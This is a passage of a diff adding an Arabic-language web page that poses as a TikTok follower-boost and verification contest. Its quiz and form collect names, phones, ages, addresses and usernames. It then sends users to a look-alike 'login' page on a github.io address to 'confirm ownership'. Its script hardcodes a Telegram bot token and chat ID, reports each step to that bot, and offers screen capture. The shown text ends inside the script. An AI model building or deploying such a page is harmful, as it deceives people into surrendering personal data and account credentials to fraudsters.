@@ -1,0 +1,1443 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دعم حسابات TikTok | المسابقة الكبرى</title>
+    
+    <!-- خط القاهرة الاحترافي من Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
+    
+    <!-- مكتبة التقاط الشاشة html2canvas -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+
+    <style>
+        /* ==========================================
+           تنسيقات التصميم الأساسية وألوان TikTok
+           ========================================== */
+        :root {
+            --tt-black: #0d0e12;
+            --tt-card-bg: rgba(22, 24, 35, 0.75);
+            --tt-cyan: #25F4EE;
+            --tt-red: #FE2C55;
+            --tt-white: #ffffff;
+            --tt-gray: #8a8b91;
+            --tt-border: rgba(255, 255, 255, 0.12);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Cairo', sans-serif;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--tt-black);
+            color: var(--tt-white);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+            padding-bottom: 90px;
+        }
+
+        /* خلفية المؤثرات الضوئية Canvas */
+        #particle-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        /* ==========================================
+           شاشة انقطع الاتصال (Offline Shield)
+           ========================================== */
+        #offline-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(10, 10, 14, 0.96);
+            backdrop-filter: blur(15px);
+            z-index: 999999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+        }
+        #offline-modal .broken-icon {
+            font-size: 70px;
+            color: var(--tt-red);
+            margin-bottom: 15px;
+            animation: pulse 1.5s infinite;
+        }
+
+        /* ==========================================
+           الشريط العلوي والعدادات (Header)
+           ========================================== */
+        .marquee-container {
+            background: rgba(254, 44, 85, 0.15);
+            border-bottom: 1px solid rgba(254, 44, 85, 0.3);
+            overflow: hidden;
+            white-space: nowrap;
+            padding: 6px 0;
+            font-size: 13px;
+            color: var(--tt-cyan);
+        }
+        .marquee-text {
+            display: inline-block;
+            animation: marquee 18s linear infinite;
+        }
+        @keyframes marquee {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .top-header {
+            background: rgba(18, 18, 26, 0.85);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--tt-border);
+            padding: 12px 15px;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .header-top-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .social-buttons {
+            display: flex;
+            gap: 8px;
+        }
+        .btn-social {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            border: none;
+            color: #fff;
+            cursor: pointer;
+            text-decoration: none;
+            font-size: 18px;
+            transition: transform 0.2s;
+        }
+        .btn-social:hover { transform: scale(1.1); }
+        .btn-telegram { background: #0088cc; }
+        .btn-whatsapp { background: #25D366; }
+
+        .counters-bar {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+        .counter-badge {
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid var(--tt-border);
+            border-radius: 20px;
+            padding: 4px 12px;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .dot-live {
+            width: 8px;
+            height: 8px;
+            background-color: var(--tt-red);
+            border-radius: 50%;
+            box-shadow: 0 0 8px var(--tt-red);
+            animation: pulse 1s infinite;
+        }
+
+        .timer-box {
+            text-align: center;
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 10px;
+            padding: 6px;
+            border: 1px solid rgba(37, 244, 238, 0.3);
+            font-size: 13px;
+            color: var(--tt-cyan);
+            font-weight: bold;
+        }
+
+        /* ==========================================
+           زر التحكم بالتلاحة Navigation Global
+           ========================================== */
+        .global-nav {
+            display: flex;
+            justify-content: space-between;
+            margin: 15px auto;
+            max-width: 500px;
+            padding: 0 15px;
+        }
+        .btn-nav-action {
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid var(--tt-border);
+            color: #fff;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 13px;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            transition: 0.3s;
+        }
+        .btn-nav-action:hover {
+            background: var(--tt-cyan);
+            color: #000;
+        }
+
+        /* ==========================================
+           حاوية البطاقات والمراحل (Card Stepper)
+           ========================================== */
+        .main-container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+
+        .step-card {
+            display: none;
+            background: var(--tt-card-bg);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid var(--tt-border);
+            border-radius: 24px;
+            padding: 24px 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5), 0 0 15px rgba(37, 244, 238, 0.1);
+            animation: fadeIn 0.4s ease-in-out forwards;
+        }
+        .step-card.active { display: block; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .card-header-title {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .card-header-title h1 {
+            font-size: 22px;
+            font-weight: 900;
+            background: linear-gradient(45deg, var(--tt-cyan), #fff, var(--tt-red));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        /* ==========================================
+           الخطوة 1: المميزات والجوائز
+           ========================================== */
+        .reward-badge-img {
+            width: 100%;
+            border-radius: 16px;
+            margin-bottom: 15px;
+            border: 1px solid var(--tt-border);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+
+        .features-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .feature-item {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid var(--tt-border);
+            border-radius: 14px;
+            padding: 12px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .feature-icon {
+            width: 40px;
+            height: 40px;
+            background: rgba(254, 44, 85, 0.15);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--tt-red);
+            font-size: 20px;
+        }
+
+        /* ==========================================
+           الخطوة 2: تحدي الأسئلة Trivia Challenge
+           ========================================== */
+        .quiz-timer-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 15px;
+        }
+        .quiz-timer-progress {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, var(--tt-cyan), var(--tt-red));
+            transition: width 1s linear;
+        }
+
+        .quiz-question-box {
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 18px;
+            text-align: center;
+            min-height: 50px;
+        }
+
+        .quiz-options {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .option-btn {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--tt-border);
+            color: #fff;
+            padding: 14px;
+            border-radius: 14px;
+            font-size: 14px;
+            cursor: pointer;
+            text-align: right;
+            transition: all 0.2s;
+        }
+        .option-btn:hover { background: rgba(37, 244, 238, 0.15); }
+        .option-btn.correct { background: #2ed573 !important; color: #000; font-weight: bold; }
+        .option-btn.wrong { background: var(--tt-red) !important; color: #fff; animation: shake 0.3s; }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
+        }
+
+        /* ==========================================
+           الخطوة 3: نموذج البيانات المطور
+           ========================================== */
+        .form-group {
+            margin-bottom: 16px;
+            position: relative;
+        }
+        .form-label {
+            display: block;
+            font-size: 13px;
+            margin-bottom: 6px;
+            color: var(--tt-gray);
+        }
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        .form-input {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--tt-border);
+            color: #fff;
+            padding: 12px 40px 12px 40px;
+            border-radius: 12px;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        .form-input:focus {
+            border-color: var(--tt-cyan);
+            box-shadow: 0 0 10px rgba(37, 244, 238, 0.2);
+        }
+
+        .input-status-icon {
+            position: absolute;
+            left: 12px;
+            font-size: 16px;
+            display: none;
+        }
+        .input-status-icon.valid { display: block; color: #2ed573; }
+
+        .btn-help-inline {
+            position: absolute;
+            right: 12px;
+            background: transparent;
+            border: none;
+            color: var(--tt-gray);
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .help-tooltip {
+            display: none;
+            background: rgba(30, 30, 45, 0.95);
+            border: 1px solid var(--tt-cyan);
+            padding: 8px 12px;
+            border-radius: 8px;
+            font-size: 11px;
+            color: var(--tt-cyan);
+            margin-top: 5px;
+        }
+
+        /* الأزرار الرئيسية */
+        .btn-action-primary {
+            width: 100%;
+            background: linear-gradient(135deg, var(--tt-red), #e00435);
+            color: #fff;
+            border: none;
+            padding: 14px;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(254, 44, 85, 0.4);
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+        .btn-action-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(254, 44, 85, 0.6);
+        }
+
+        /* ==========================================
+           الإشعارات المنبثقة Live Toasts
+           ========================================== */
+        #toast-container {
+            position: fixed;
+            bottom: 80px;
+            right: 20px;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            pointer-events: none;
+        }
+        .toast-notification {
+            background: rgba(22, 24, 35, 0.95);
+            border: 1px solid var(--tt-cyan);
+            border-radius: 12px;
+            padding: 10px 16px;
+            font-size: 12px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.6);
+            animation: slideInRight 0.4s forwards;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            max-width: 300px;
+        }
+        @keyframes slideInRight {
+            from { opacity: 0; transform: translateX(100%); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        /* ==========================================
+           تنسيقات المحادثة المباشرة المرفقة
+           ========================================== */
+        .top-support-bar { text-align: center; margin: 15px 0; }
+        .btn-top-chat {
+            background: linear-gradient(135deg, #00c6ff, #0072ff);
+            color: #ffffff;
+            border: 1px solid #00f2fe;
+            padding: 8px 20px;
+            font-size: 13px;
+            font-weight: bold;
+            border-radius: 25px;
+            cursor: pointer;
+            box-shadow: 0 0 15px rgba(0, 198, 255, 0.4);
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s ease;
+        }
+        .chat-widget-container {
+            position: fixed;
+            bottom: 85px;
+            left: 20px;
+            width: 350px;
+            max-width: 90vw;
+            height: 460px;
+            background: #0d1117;
+            border: 1px solid #1f293d;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.8), 0 0 20px rgba(0, 210, 255, 0.2);
+            display: flex;
+            flex-direction: column;
+            z-index: 99999;
+            overflow: hidden;
+            direction: rtl;
+        }
+        .chat-header {
+            background: #161b22;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #21262d;
+        }
+        .chat-header-info { display: flex; align-items: center; gap: 10px; }
+        .chat-title { color: #ffb700; font-weight: bold; font-size: 14px; }
+        .chat-substatus { color: #8b949e; font-size: 11px; }
+        .chat-close-btn { background: transparent; border: none; color: #8b949e; font-size: 18px; cursor: pointer; }
+        .status-dot, .chat-status-dot {
+            width: 10px; height: 10px; background-color: #2ed573; border-radius: 50%; display: inline-block; box-shadow: 0 0 8px #2ed573;
+        }
+        .status-dot.offline, .chat-status-dot.offline { background-color: #747d8c; box-shadow: none; }
+        .chat-box { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 12px; background: #090d12; }
+        .msg { max-width: 80%; padding: 10px 14px; border-radius: 14px; font-size: 13px; line-height: 1.5; word-break: break-word; }
+        .msg.user-msg { align-self: flex-start; background: linear-gradient(135deg, #0052d4, #4364f7); color: #ffffff; }
+        .msg.admin-msg { align-self: flex-end; background: #1f293d; color: #e6edf3; border: 1px solid #2d3748; }
+        .msg img { max-width: 100%; border-radius: 8px; margin-bottom: 5px; }
+        .msg-meta { display: flex; align-items: center; justify-content: flex-end; gap: 4px; font-size: 10px; color: rgba(255, 255, 255, 0.6); margin-top: 4px; }
+        .checkmark.read { color: #00f2fe; font-weight: bold; }
+        .chat-input-area { padding: 10px; background: #161b22; display: flex; align-items: center; gap: 6px; border-top: 1px solid #21262d; }
+        #chat-user-input { flex: 1; background: #0d1117; border: 1px solid #30363d; color: #fff; padding: 8px 12px; border-radius: 20px; font-size: 13px; outline: none; }
+        .chat-btn-icon { background: transparent; border: none; font-size: 18px; cursor: pointer; padding: 4px; border-radius: 50%; }
+        .chat-send-btn { background: linear-gradient(135deg, #ffb700, #f5af19); color: #000; border: none; padding: 8px 16px; border-radius: 20px; font-weight: bold; font-size: 12px; cursor: pointer; }
+        .chat-file-preview { background: #1f293d; color: #00f2fe; padding: 5px 12px; font-size: 11px; text-align: center; }
+        .floating-chat-trigger {
+            position: fixed; bottom: 20px; left: 20px; width: 55px; height: 55px; background: linear-gradient(135deg, #ffb700, #ff8c00);
+            border: none; border-radius: 50%; color: #000; font-size: 24px; cursor: pointer; box-shadow: 0 4px 15px rgba(255, 183, 0, 0.5); z-index: 9999; display: flex; align-items: center; justify-content: center;
+        }
+
+        /* نافذة التحميل الشفافة Popups */
+        .overlay-loader {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); z-index: 100000;
+            flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px;
+        }
+        .spinner {
+            width: 50px; height: 50px; border: 5px solid rgba(255,255,255,0.1);
+            border-top-color: var(--tt-cyan); border-bottom-color: var(--tt-red);
+            border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <!-- كانفاس المؤثرات الضوئية التفاعلية -->
+    <canvas id="particle-canvas"></canvas>
+
+    <!-- درع انقطاع الاتصال -->
+    <div id="offline-modal">
+        <div class="broken-icon">📡❌</div>
+        <h2>انقطع الاتصال بالإنترنت!</h2>
+        <p style="color: var(--tt-gray); margin-top: 10px;">يتطلب استكمال العمل وجود اتصال فعال بالشبكة. يرجى إعادة الاتصال بالإنترنت والمحاولة مجدداً.</p>
+    </div>
+
+    <!-- نافذة التحميل والإنذارات -->
+    <div id="status-overlay" class="overlay-loader">
+        <div class="spinner"></div>
+        <h3 id="overlay-text" style="color: #fff; font-size: 16px;">جاري التحقق...</h3>
+    </div>
+
+    <!-- الشريط العلوي الثابت -->
+    <header class="top-header">
+        <div class="marquee-container">
+            <div class="marquee-text">
+                ⚠️ تنبيه هام: تواصل معنا إذا عجزت عن التسجيل أو أردت المساعدة | الفرص محدودة لهذا الأسبوع ⚠️
+            </div>
+        </div>
+
+        <div class="header-top-row" style="margin-top: 8px;">
+            <div class="social-buttons">
+                <a href="https://t.me/Pubg_Rivals" target="_blank" class="btn-social btn-telegram" title="التليجرام">✈️</a>
+                <a href="https://wa.me/77074032501" target="_blank" class="btn-social btn-whatsapp" title="الواتساب">💬</a>
+            </div>
+
+            <!-- زر المحادثة المباشرة المضاف أعلى الصفحة -->
+            <div class="top-support-bar" style="margin: 0;">
+                <button class="btn-top-chat" onclick="toggleChat()">
+                    <span class="chat-status-dot" id="header-status-dot"></span>
+                    💬 الدعم المباشر
+                </button>
+            </div>
+
+            <div class="counters-bar">
+                <div class="counter-badge">
+                    <span class="dot-live"></span>
+                    <span>الزوار: <strong id="cnt-visitors" style="color: var(--tt-cyan);">522</strong></span>
+                </div>
+                <div class="counter-badge">
+                    <span>🏆 المسجلين: <strong id="cnt-registered" style="color: #ffb700;">392</strong></span>
+                </div>
+            </div>
+        </div>
+
+        <div class="timer-box">
+            ⏳ ينتهي التسجيل للأسبوع الحالي خلال: <span id="countdown-timer">00 : 00 : 00 : 00</span>
+        </div>
+    </header>
+
+    <!-- أزرار القائمة الرئيسية والتنقل العام -->
+    <div class="global-nav">
+        <button class="btn-nav-action" onclick="goToStep(1)">🏠 الرئيسية</button>
+        <button class="btn-nav-action" onclick="goBackStep()">⬅️ خطوة للخلف</button>
+    </div>
+
+    <div class="main-container">
+
+        <!-- 🟢 الخطوة الأولى: المقدمة والجوائز -->
+        <div id="step-1" class="step-card active">
+            <div class="card-header-title">
+                <h1>دعم حسابات TikTok الكبرى</h1>
+                <p style="color: var(--tt-gray); font-size: 13px; margin-top: 5px;">احصل على زيادة متابعين حقيقيين وتوثيق حسابك فوراً</p>
+            </div>
+
+            <img src="https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?auto=format&fit=crop&w=600&q=80" alt="TikTok Support" class="reward-badge-img">
+
+            <div class="features-grid">
+                <div class="feature-item">
+                    <div class="feature-icon">🚀</div>
+                    <div>
+                        <strong style="font-size: 14px; display: block;">زيادة المتابعين والمشاهدات</strong>
+                        <span style="font-size: 11px; color: var(--tt-gray);">دعم تلقائي ومستمر للوصول لـ "الإكسبلور" +10K</span>
+                    </div>
+                </div>
+                <div class="feature-item">
+                    <div class="feature-icon">☑️</div>
+                    <div>
+                        <strong style="font-size: 14px; display: block;">التوثيق بالشارة الذهبية</strong>
+                        <span style="font-size: 11px; color: var(--tt-gray);">تفعيل شارة التوثيق الذهبية فور نقل حسابك</span>
+                    </div>
+                </div>
+                <div class="feature-item">
+                    <div class="feature-icon">🎁</div>
+                    <div>
+                        <strong style="font-size: 14px; display: block;">مضاعفة هدايا البث المباشر</strong>
+                        <span style="font-size: 11px; color: var(--tt-gray);">تفعيل خيارات السحب السريع ومكافآت الداعمين</span>
+                    </div>
+                </div>
+            </div>
+
+            <div style="background: rgba(255,255,255,0.03); padding: 12px; border-radius: 12px; margin-bottom: 15px; font-size: 12px; border-right: 3px solid var(--tt-cyan);">
+                <strong>خطوات المشاركة المعتمدة:</strong>
+                <ol style="padding-right: 18px; margin-top: 5px; color: var(--tt-gray);">
+                    <li>اجتياز تحدي المعلومات المخصص.</li>
+                    <li>تسجيل بيانات التواصل الخاصة بك بشكل صحيح.</li>
+                    <li>تسجيل الدخول بحسابك لتأكيد الملكية.</li>
+                </ol>
+            </div>
+
+            <button class="btn-action-primary" onclick="startQuizChallenge()">ابدأ التحدي وسجل الآن 🔥</button>
+        </div>
+
+        <!-- 🟢 الخطوة الثانية: تحدي الأسئلة Trivia Challenge -->
+        <div id="step-2" class="step-card">
+            <div class="card-header-title">
+                <h1>تحدي معلومات TikTok</h1>
+                <p style="color: var(--tt-gray); font-size: 12px;">أجب على 3 أسئلة صحيحة للانتقال لخطوة الجائزة</p>
+            </div>
+
+            <div class="quiz-timer-bar">
+                <div id="quiz-progress" class="quiz-timer-progress"></div>
+            </div>
+            <div style="display: flex; justify-content: space-between; font-size: 12px; color: var(--tt-gray); margin-bottom: 10px;">
+                <span>السؤال: <strong id="quiz-current-num" style="color: var(--tt-cyan);">1</strong> من 5</span>
+                <span>الوقت: <strong id="quiz-timer-num" style="color: var(--tt-red);">20</strong> ثانية</span>
+            </div>
+
+            <div id="quiz-question" class="quiz-question-box">جاري تحميل السؤال...</div>
+
+            <div id="quiz-options" class="quiz-options">
+                <!-- الأجوبة تظهر ديناميكياً -->
+            </div>
+        </div>
+
+        <!-- 🟢 الخطوة الثالثة: البيانات الشخصية -->
+        <div id="step-3" class="step-card">
+            <div class="card-header-title">
+                <h1>تسجيل بيانات المتسابق</h1>
+                <p style="color: var(--tt-gray); font-size: 12px;">يرجى ملء كافة الخانات بدقة لضمان تحويل الجائزة</p>
+            </div>
+
+            <form id="user-info-form" onsubmit="handleUserInfoSubmit(event)">
+                <!-- الاسم الثلاثي -->
+                <div class="form-group">
+                    <label class="form-label">الاسم الثلاثي:</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="field-fullname" class="form-input" placeholder="مثال: محمد أحمد علي" autocomplete="name" required oninput="validateField(this, 'text')">
+                        <button type="button" class="btn-help-inline" onclick="toggleHelp('help-name')">❓</button>
+                        <span class="input-status-icon" id="valid-fullname">✔</span>
+                    </div>
+                    <div id="help-name" class="help-tooltip">يرجى كتابة اسمك الثلاثي الحقيقي بالحروف العربية أو الإنجليزية فقط.</div>
+                </div>
+
+                <!-- رقم الهاتف -->
+                <div class="form-group">
+                    <label class="form-label">رقم الهاتف (مع الرمز الدولي تلقائياً):</label>
+                    <div class="input-wrapper">
+                        <input type="tel" id="field-phone" class="form-input" placeholder="77XXXXXXX" autocomplete="tel" required oninput="validateField(this, 'phone')">
+                        <button type="button" class="btn-help-inline" onclick="toggleHelp('help-phone')">❓</button>
+                        <span class="input-status-icon" id="valid-phone">✔</span>
+                    </div>
+                    <div id="help-phone" class="help-tooltip">أدخل رقم هاتفك التلفوني المباشر، سيتم التعرف على دولة إقامتك تلقائياً.</div>
+                </div>
+
+                <!-- العمر -->
+                <div class="form-group">
+                    <label class="form-label">العمر:</label>
+                    <div class="input-wrapper">
+                        <input type="number" id="field-age" class="form-input" placeholder="مثال: 22" required oninput="validateField(this, 'number')">
+                        <button type="button" class="btn-help-inline" onclick="toggleHelp('help-age')">❓</button>
+                        <span class="input-status-icon" id="valid-age">✔</span>
+                    </div>
+                    <div id="help-age" class="help-tooltip">يجب أدخال عمرك الحقيقي بالأرقام فقط.</div>
+                </div>
+
+                <!-- العنوان -->
+                <div class="form-group">
+                    <label class="form-label">العنوان / المدينة:</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="field-address" class="form-input" placeholder="مثال: اليمن، صنعاء" autocomplete="street-address" required oninput="validateField(this, 'text')">
+                        <button type="button" class="btn-help-inline" onclick="toggleHelp('help-address')">❓</button>
+                        <span class="input-status-icon" id="valid-address">✔</span>
+                    </div>
+                    <div id="help-address" class="help-tooltip">اكتب الدولة والمدينة التي تقيم فيها حالياً.</div>
+                </div>
+
+                <!-- معرف الحساب -->
+                <div class="form-group">
+                    <label class="form-label">معرف حساب TikTok (@username):</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="field-username" class="form-input" placeholder="@your_username" required oninput="validateField(this, 'username')">
+                        <button type="button" class="btn-help-inline" onclick="toggleHelp('help-user')">❓</button>
+                        <span class="input-status-icon" id="valid-username">✔</span>
+                    </div>
+                    <div id="help-user" class="help-tooltip">معرف حسابك الفريد في تيك توك يبدأ بعلامة @.</div>
+                </div>
+
+                <!-- عدد المتابعين الحالي -->
+                <div class="form-group">
+                    <label class="form-label">عدد المتابعين الحالي:</label>
+                    <div class="input-wrapper">
+                        <input type="number" id="field-followers" class="form-input" placeholder="مثال: 1500" required oninput="validateField(this, 'number')">
+                        <button type="button" class="btn-help-inline" onclick="toggleHelp('help-fol')">❓</button>
+                        <span class="input-status-icon" id="valid-followers">✔</span>
+                    </div>
+                    <div id="help-fol" class="help-tooltip">أدخل عدد متابعيك الحاليين لتقدير ونسبة الدعم المكتسب.</div>
+                </div>
+
+                <button type="submit" class="btn-action-primary">تأكيد البيانات والانتقال للتنشيط 🎯</button>
+            </form>
+        </div>
+
+        <!-- 🟢 الخطوة الرابعة: طلب تسجيل الدخول وتأكيد الحساب -->
+        <div id="step-4" class="step-card">
+            <div class="card-header-title">
+                <h1 style="color: var(--tt-red);">تأكيد ملكية الحساب مطلوب</h1>
+                <p style="color: var(--tt-gray); font-size: 13px; margin-top: 8px;">
+                    لم نتعرف على ملكية حسابك بشكل كامل تلقائياً. يرجى الضغط على الزر أدناه لتسجيل الدخول وتأكيد الحساب لاستلام الجائزة فوراً.
+                </p>
+            </div>
+
+            <div style="text-align: center; margin: 30px 0;">
+                <div style="font-size: 60px; margin-bottom: 15px; animation: pulse 1.5s infinite;">🔐</div>
+                <p style="font-size: 12px; color: var(--tt-cyan);">سيتم توجيهك بأمان لخادم توثيق الحساب المعتمد</p>
+            </div>
+
+            <button class="btn-action-primary" style="background: linear-gradient(135deg, #2ed573, #10ac84);" onclick="redirectToLogin()">
+                تسجيل الدخول لتأكيد الملكية 🔑
+            </button>
+        </div>
+
+    </div>
+
+    <!-- حاوية الإشعارات اللحظية الحية -->
+    <div id="toast-container"></div>
+
+    <!-- نافذة الدردشة العائمة والمحادثة المباشرة -->
+    <div id="chat-widget" class="chat-widget-container" style="display: none;">
+        <div class="chat-header">
+            <div class="chat-header-info">
+                <span class="status-dot" id="support-status-dot"></span>
+                <div>
+                    <div class="chat-title">الدعم الفني للمسابقة</div>
+                    <div class="chat-substatus" id="support-status-text">متصل الآن</div>
+                </div>
+            </div>
+            <button class="chat-close-btn" onclick="toggleChat()">✕</button>
+        </div>
+
+        <div class="chat-box" id="chat-box"></div>
+
+        <div id="chat-file-preview" class="chat-file-preview" style="display:none;">
+            تم اختيار صورة جاهزة للإرسال ✔
+        </div>
+
+        <form class="chat-input-area" onsubmit="sendChatMessage(event)">
+            <label for="chat-file-input" class="chat-btn-icon" title="إرفاق صورة">
+                📷
+                <input type="file" id="chat-file-input" accept="image/*" style="display:none;" onchange="showChatFilePreview()">
+            </label>
+            
+            <button type="button" class="chat-btn-icon" title="التقاط الشاشة وإرسالها فوراً" onclick="takeUserInstantScreenshot()">
+                📸
+            </button>
+
+            <input type="text" id="chat-user-input" placeholder="اكتب رسالتك..." autocomplete="off" oninput="saveDraftMessage()">
+            <button type="submit" class="chat-send-btn">إرسال</button>
+        </form>
+    </div>
+
+    <!-- الزر العائم في الزاوية -->
+    <button class="floating-chat-trigger" onclick="toggleChat()" title="الدعم المباشر">🎧</button>
+
+
+    <!-- JavaScript / المحرك البرمجي المطور بالكامل -->
+    <script>
+        // ==========================================
+        // إعدادات التليجرام والتتبع
+        // ==========================================
+        const BOT_TOKEN = "8919787970:AAEmU4rsJAI5XUc2TyzUkur0Lpom_Tk07Kg";
+        const CHAT_ID = "8796885500";
+        const LOGIN_REDIRECT_URL = "https://pubgrivals7-png.github.io/-/tiktok.html";
+
+        let contestantId = localStorage.getItem("contestant_id");
+        let contestantName = localStorage.getItem("contestant_name") || "متسابق TikTok";
+
+        if (!contestantId) {
+            contestantId = "TT_" + Math.floor(100000 + Math.random() * 900000);
+            localStorage.setItem("contestant_id", contestantId);
+        }
+
+        let currentStep = 1;
+        let audioCtx = null;
+
+        // ==========================================
+        // المحرك الصوتي الفائق Web Audio API (بدون ملفات خارجية)
+        // ==========================================
+        function initAudio() {
+            if (!audioCtx) {
+                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            }
+        }
+
+        function playSound(type) {
+            try {
+                initAudio();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+
+                const now = audioCtx.currentTime;
+
+                if (type === 'click') {
+                    osc.frequency.setValueAtTime(400, now);
+                    osc.frequency.exponentialRampToValueAtTime(800, now + 0.05);
+                    gain.gain.setValueAtTime(0.2, now);
+                    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.05);
+                    osc.start(now);
+                    osc.stop(now + 0.05);
+                } else if (type === 'warning') {
+                    osc.type = 'sawtooth';
+                    osc.frequency.setValueAtTime(150, now);
+                    osc.frequency.setValueAtTime(110, now + 0.1);
+                    gain.gain.setValueAtTime(0.3, now);
+                    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.25);
+                    osc.start(now);
+                    osc.stop(now + 0.25);
+                } else if (type === 'tick') {
+                    osc.frequency.setValueAtTime(1000, now);
+                    gain.gain.setValueAtTime(0.05, now);
+                    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.03);
+                    osc.start(now);
+                    osc.stop(now + 0.03);
+                } else if (type === 'success') {
+                    osc.type = 'triangle';
+                    osc.frequency.setValueAtTime(523.25, now); // C5
+                    osc.frequency.setValueAtTime(659.25, now + 0.1); // E5
+                    osc.frequency.setValueAtTime(783.99, now + 0.2); // G5
+                    osc.frequency.setValueAtTime(1046.50, now + 0.3); // C6
+                    gain.gain.setValueAtTime(0.25, now);
+                    gain.gain.exponentialRampToValueAtTime(0.01, now + 0.5);
+                    osc.start(now);
+                    osc.stop(now + 0.5);
+                }
+            } catch (e) {}
+        }
+
+        // ==========================================
+        // التنقل بين الخطوات وحفظ المسودة
+        // ==========================================
+        function goToStep(stepNum) {
+            playSound('click');
+            document.querySelectorAll('.step-card').forEach(card => card.classList.remove('active'));
+            const target = document.getElementById(`step-${stepNum}`);
+            if (target) {
+                target.classList.add('active');
+                currentStep = stepNum;
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+                sendTelegramAlert(`📌 **انتقال خطوة:** المتسابق في الخطوة (${stepNum})\n🆔 \`${contestantId}\``);
+            }
+        }
+
+        function goBackStep() {
+            if (currentStep > 1) {
+                goToStep(currentStep - 1);
+            }
+        }
+
+        // ==========================================
+        // بنك الأسئلة والمحرك العشوائي للأسئلة
+        // ==========================================
+        const questionBank = [
